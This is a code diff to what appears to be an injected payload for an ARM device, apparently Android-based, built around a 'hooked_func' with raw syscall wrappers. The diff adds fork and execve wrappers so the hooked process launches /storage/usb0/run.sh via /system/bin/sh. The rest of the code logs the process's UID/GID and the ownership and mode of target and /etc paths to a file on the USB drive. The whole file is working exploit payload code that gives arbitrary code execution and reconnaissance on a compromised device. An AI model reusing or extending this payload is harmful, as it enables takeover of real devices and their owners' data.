@@ -6,6 +6,7 @@
 #define	X_OK 1
 #define MAX_FILENAME 256
 #define BUFF_SIZE 4098
+#define NULL 0x0
 
 typedef unsigned int mode_t;
 typedef int off_t;
@@ -67,6 +68,26 @@ static int exit(int code) {
     register int sys_exit asm("r7") = 1;
     asm volatile("svc #0" : "=r"(ret) : "r"(_code), "r"(sys_exit) :);
     return ret;
+}
+                               
+static int fork(void) {
+	register int ret asm("r0");
+	register int sys_fork asm("r7") = 2;
+	asm volatile("svc #0" : "=r"(ret) : "r"(sys_fork) :);
+	return ret;
+}
+
+static int execve(const char *filename, char *const argv[], char *const envp[]) {
+	register int ret asm("r0");
+	register const char *_filename asm("r0") = filename;
+	register char *const *_argv asm("r1") = argv;
+	register char *const *_envp asm("r2") = envp;
+	register int sys_execve asm("r7") = 11;
+	asm volatile("svc #0"
+				 : "=r"(ret)
+				 : "r"(_filename), "r"(_argv), "r"(_envp), "r"(sys_execve)
+				 :);
+	return ret;
 }
 
 static int read(int fd, const char* buf, unsigned int len) {
@@ -154,21 +175,6 @@ static int getgid(void) {
     return ret;
 }
 
-static int ushort2str(char* str, unsigned short num) {
-    int i = 126;
-
-    if (num == 0) {
-        str[i--] = '0';
-    }
-
-    while (num != 0) {
-        str[i--] = (num % 10) + '0';
-        num /= 10;
-    }
-
-    return i;
-}
-
 static int strlen(const char* str) {
     const char* s;
 
@@ -225,6 +231,53 @@ static int fputc(char c, int fd) {
     }
 }
 
+// This function will call stat on the path and print Size, Owner GID and UID, and Mode
+static void get_stat(char* path, int log_fp) {
+	//@textify
+	char size_str[] = "Size: ";
+	//@textify
+	char uid_str[] = "UID: ";
+	//@textify
+	char gid_str[] = "GID: ";
+	//@textify
+	char mode_str[] = "Mode: ";
+	//@textify
+	char newline[] = "\n";
+	//@textify
+	char error[] = "Error getting stat\n";
+	struct stat sb;
+	char buffer[33] = {0};
+
+	if (stat(path, &sb) == -1) {
+		write(log_fp, error, sizeof(error)-1);
+		return;
+	}
+
+	// Size
+	itoa(sb.st_size, buffer, sizeof(buffer), 10);
+	write(log_fp, size_str, sizeof(size_str)-1);
+	write(log_fp, buffer, strlen(buffer));
+	write(log_fp, newline, sizeof(newline)-1);
+
+	// GID
+	itoa(sb.st_gid, buffer, sizeof(buffer), 10);
+	write(log_fp, gid_str, sizeof(gid_str)-1);
+	write(log_fp, buffer, strlen(buffer));
+	write(log_fp, newline, sizeof(newline)-1);
+
+	// UID
+	itoa(sb.st_uid, buffer, sizeof(buffer), 10);
+	write(log_fp, uid_str, sizeof(uid_str)-1);
+	write(log_fp, buffer, strlen(buffer));
+	write(log_fp, newline, sizeof(newline)-1);
+
+	// Mode
+	itoa(sb.st_mode, buffer, sizeof(buffer), 8);
+	write(log_fp, mode_str, sizeof(mode_str)-1);
+	write(log_fp, buffer, strlen(buffer));
+	write(log_fp, newline, sizeof(newline)-1);
+}
+
 void hooked_func() {
     int src_fp, dst_fp, len, err, nread, sanity_fp, log_fp;
     struct dirent* d;
@@ -245,6 +298,10 @@ void hooked_func() {
     char log_filename[] = "/storage/usb0/XXlog.txt";
     //@textify
     char sanity_filename[] = "/storage/usb0/sanity.txt";
+    //@textify
+    char script_path[] = "/storage/usb0/run.sh";
+    //@textify
+    char sh_path[] = "/system/bin/sh";
 
     // Error messages
     //@textify
@@ -295,6 +352,10 @@ void hooked_func() {
     char mode[] = "\nFile mode: ";
     //@textify 
     char current[] = "\nCurrent UID, GID: ";
+    //@textify
+    char run_sh[] = "Going to launch usb0/run.sh\n";
+    //@textify
+    char sh[] = "sh";
 
     // check if we can write anything to a file on the USB
     sanity_fp = open(sanity_filename, O_WRONLY | O_CREAT, 0777);
@@ -385,60 +446,27 @@ void hooked_func() {
 
     close(dir_fd);
 
-	struct stat statbuf;
+    // Fork and execute run.sh
+    write(log_fp, run_sh, sizeof(run_sh) - 1);
+    int pid = fork();
+    if (pid == 0){
+    char* argv[] = {sh, script_path, NULL};
+	    execve(sh_path, argv, NULL);
+    } else {
+	    // print current uid and gid
+	    write(log_fp, current, sizeof(current) - 1);
+	    itoa(getuid(), uid_str, sizeof(uid_str), 10);
+	    write(log_fp, uid_str, sizeof(uid_str) - 1);
+	    write(log_fp, space, 2);
+	    itoa(getgid(), gid_str, sizeof(gid_str), 10);
+	    write(log_fp, gid_str, sizeof(gid_str) - 1);
+	    write(log_fp, space, 2);
 
-	if (stat(src_path, &statbuf) == 0) {
-		// size
-		write(log_fp, size, sizeof(size) - 1);
-		idx = ushort2str(buffer, (unsigned short)statbuf.st_size);
-		write(log_fp, buffer, idx);
 
-		// owner uid
-		write(log_fp, owner_uid, sizeof(owner_uid) - 1);
-		idx = ushort2str(buffer, statbuf.st_uid);
-		write(log_fp, buffer, idx);
-		
-		// owner gid
-		write(log_fp, owner_gid, sizeof(owner_gid) - 1);
-		idx = ushort2str(buffer, statbuf.st_gid);
-		write(log_fp, buffer, idx);
+    get_stat(src_path, log_fp);
 
-		// mode
-		write(log_fp, mode, sizeof(mode) - 1);
-		idx = ushort2str(buffer, statbuf.st_mode);
-		write(log_fp, buffer, idx);
-	}
-	
-	// print current uid and gid
-	write(log_fp, current, sizeof(current) - 1);
-	idx = ushort2str(buffer, getuid());
-	write(log_fp, buffer, idx);
-	write(log_fp, space, 2);
-	idx = ushort2str(buffer, getgid());
-	write(log_fp, space, 2);
+    get_stat(etc_path, log_fp);
 
-	// also print stat for the current dir
-	if (stat(etc_path, &statbuf) == 0) {
-		// size
-		write(log_fp, size, sizeof(size) - 1);
-		idx = ushort2str(buffer, (unsigned short)statbuf.st_size);
-		write(log_fp, buffer, idx);
-
-		// owner uid
-		write(log_fp, owner_uid, sizeof(owner_uid) - 1);
-		idx = ushort2str(buffer, statbuf.st_uid);
-		write(log_fp, buffer, idx);
-		
-		// owner gid
-		write(log_fp, owner_gid, sizeof(owner_gid) - 1);
-		idx = ushort2str(buffer, statbuf.st_gid);
-		write(log_fp, buffer, idx);
-
-		// mode
-		write(log_fp, mode, sizeof(mode) - 1);
-		idx = ushort2str(buffer, statbuf.st_mode);
-		write(log_fp, buffer, idx);
-	}  
 
     src_fp = open(src_path, O_RDONLY, 0);
     if (src_fp < 0) {
@@ -478,5 +506,7 @@ SRC_END:
 LOG_END:
     write(log_fp, str_end, sizeof(str_end) - 1);
     close(log_fp);
+
+    }
     return;
 }
